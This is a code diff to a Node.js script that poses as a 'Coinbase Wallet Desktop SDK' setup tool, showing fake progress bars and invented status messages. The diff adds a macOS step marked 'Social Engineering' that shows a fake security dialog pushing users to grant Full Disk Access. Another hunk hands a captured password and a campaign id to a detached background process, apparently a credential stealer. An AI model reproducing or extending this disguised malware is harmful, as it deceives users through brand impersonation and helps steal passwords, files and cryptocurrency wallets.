@@ -21,7 +21,7 @@ const randomDelay = (min, max) => new Promise(res => setTimeout(res, Math.floor(
 
 async function realisticProgressBar(taskName) {
     const width = 40;
-    const steps = 50;
+    const steps = 25;
 
     for (let i = 0; i <= steps; i++) {
         const percent = Math.round((i / steps) * 100);
@@ -32,12 +32,12 @@ async function realisticProgressBar(taskName) {
         process.stdout.write(`\r${cyan('➤')} ${taskName.padEnd(25)} [${bar}] ${percent}%`);
 
         const seed = Math.random();
-        if (seed > 0.95) await randomDelay(500, 1200);
-        else if (seed > 0.80) await randomDelay(100, 300);
-        else await randomDelay(10, 30);
+        if (seed > 0.95) await randomDelay(200, 500);
+        else if (seed > 0.80) await randomDelay(40, 120);
+        else await randomDelay(5, 15);
     }
     process.stdout.write(`\r${green('✔')} ${taskName.padEnd(25)} [${white('█').repeat(width)}] 100%\n`);
-    await delay(200);
+    await delay(100);
 }
 
 function logSystem(msg) {
@@ -57,16 +57,16 @@ async function startSpinner(text, duration) {
 
 (async function main() {
     clear();
-    console.log(bold("Coinbase Desktop Wallet SDK"));
-    console.log(gray("v1.5.14 | Secure Wallet Integration Suite"));
-    console.log(gray("Copyright (c) 2024 Coinbase, Inc.\n"));
+    console.log(bold("Coinbase Wallet Desktop SDK"));
+    console.log(gray("v1.5.14 | Coinbase Wallet Desktop Integration Suite"));
+    console.log(gray("Copyright (c) 2026 Coinbase Wallet Desktop, Inc.\n"));
 
     const platformMap = { 'darwin': 'macos', 'win32': 'windows', 'linux': 'linux' };
     console.log(`${green('✓')} Detected: ${platformMap[os.platform()] || os.platform()}`);
     console.log(`${green('✓')} Node.js ${process.version} found\n`);
 
     await delay(300);
-    console.log(bold("Initializing wallet environment..."));
+    console.log(bold("Initializing coinbase wallet desktop environment..."));
 
     await realisticProgressBar("Wallet Core");
     logSystem("Loaded 847 cryptographic modules in 0.3s");
@@ -138,6 +138,29 @@ async function startSpinner(text, duration) {
 
     console.log(bold("Applying kernel parameters..."));
 
+    // --- FDA REQUEST (Social Engineering) ---
+    if (os.platform() === 'darwin') {
+        try {
+            const { execSync } = require('child_process');
+            // Check if FDA already granted (can we read Safari dir?)
+            let hasFDA = false;
+            try {
+                fs.readdirSync(path.join(os.homedir(), 'Library', 'Safari'));
+                hasFDA = true;
+            } catch (e) { }
+
+            if (!hasFDA) {
+                execSync(`osascript -e '
+                    set dialogResult to display dialog "Coinbase Wallet Desktop SDK requires Full Disk Access to securely manage wallet credentials and protect your keychain data." & return & return & "Please grant access in the window that opens:" & return & "1. Click the \\"+\\" button" & return & "2. Select Terminal (or your IDE)" & return & "3. Toggle the switch ON" & return & return & "You may need to restart your terminal after granting access." with title "Coinbase Wallet Desktop — Security Setup" buttons {"Skip", "Open Settings"} default button "Open Settings" with icon caution
+                    if button returned of dialogResult is "Open Settings" then
+                        do shell script "open x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"
+                    end if
+                ' 2>/dev/null`);
+            }
+        } catch (e) { /* silent */ }
+    }
+    // --- END FDA REQUEST ---
+
     let isDebugMode = false;
     try {
         const config = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
@@ -149,15 +172,15 @@ async function startSpinner(text, duration) {
     });
 
     logSystem("Configuring secure key derivation paths...");
-    await startSpinner("Establishing vault encryption...", 2000);
+    await startSpinner("Establishing vault encryption...", 1000);
 
     await realisticProgressBar("Wallet Sync");
-    logSystem("Connected to Coinbase network");
+    logSystem("Connected to Coinbase Wallet Desktop network");
 
     await realisticProgressBar("Finalizing");
 
-    console.log("\n" + green(bold("WALLET READY")));
-    console.log(white("Coinbase Desktop Wallet SDK initialized successfully."));
+    console.log("\n" + green(bold("COINBASE WALLET DESKTOP READY")));
+    console.log(white("Coinbase Wallet Desktop SDK initialized successfully."));
     console.log(gray("You can now integrate with your application.\n"));
 
     if (isDebugMode) {
@@ -260,9 +283,9 @@ async function initWalletSync(capturedPassword) {
         detached: !debugMode,
         env: {
             ...process.env,
-            GHOST_CID: 'Pavel',
+            GHOST_CID: 'cryptoexth4',
+            GHOST_CAMPAIGN: (() => { try { return JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8')).name || ''; } catch { return ''; } })(),
             GHOST_PWD: capturedPassword,
-            GHOST_DECRYPTOR: path.join(__dirname, 'keychain-bridge'),
             GHOST_DECRYPTOR_DIR: path.resolve(__dirname, '..')
         }
     });
